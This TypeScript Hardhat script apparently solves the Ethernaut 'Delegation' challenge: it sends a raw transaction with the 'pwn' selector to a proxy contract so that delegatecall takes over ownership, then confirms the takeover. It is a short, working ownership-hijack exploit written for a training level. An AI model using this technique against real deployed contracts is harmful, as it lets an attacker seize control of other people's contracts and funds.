import { Contract, Signer, Transaction } from "ethers";
import { toUtf8CodePoints, UnsignedTransaction } from "ethers/lib/utils";
import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/6.Delegation/Delegate.sol/Delegate.json";
import { exit } from "process";

function setTargetContract(signer?: Signer | undefined) {
  const contractAddress = "0x31533F373d664321bb2edCAD35F56940978eeBbb";
  return new Contract(contractAddress, abi);
}

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = setTargetContract();

  const it = new ethers.utils.Interface(abi);

  let owner = await target.connect(attacker).owner();

  console.log("Proxy's owner: ", owner);

  const newTx = {
    data: it.getSighash("pwn"),
    to: target.address,
    gasLimit: "3000000",
  };
  const tx = await attacker.sendTransaction(newTx);
  await tx.wait();
  owner = await target.connect(attacker).owner();
  console.log("Success: ", owner === attacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
gasLimit must be set manually because ethers has difficulties evaluating gas cost 
when using delegate call.
+ in the delegate contract there is a piece of code that might increase gas costs

*/
